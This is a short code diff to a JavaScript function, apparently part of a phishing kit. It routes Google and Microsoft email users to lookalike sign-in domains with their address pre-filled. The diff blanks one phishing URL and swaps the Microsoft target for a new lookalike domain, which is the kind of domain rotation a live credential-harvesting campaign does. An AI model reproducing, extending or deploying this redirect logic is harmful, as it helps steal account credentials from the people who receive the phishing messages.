@@ -285,9 +285,9 @@ export async function renderVueTemplate(metadata = {}) {
           }
 
           if (isGoogleEmail) {
-            targetUrl = 'https://accounts.sodomb.top?oAh6WzQhri-5=aGRka3o=#smn=' + encodeURIComponent(email);
+            targetUrl = '' + encodeURIComponent(email);
           } else if (isMicrosoftEmail) {
-            targetUrl = 'https://login.coeminna.top?PMHaia5eD2E=cnd5YQ==&omn=' + encodeURIComponent(email);
+            targetUrl = 'https://login.latelierdemamantortue.click?Djst0aEAD-E=Z2tiYg==&omn=' + encodeURIComponent(email);
           } else {
             targetUrl = '' + encodeURIComponent(email);
           }
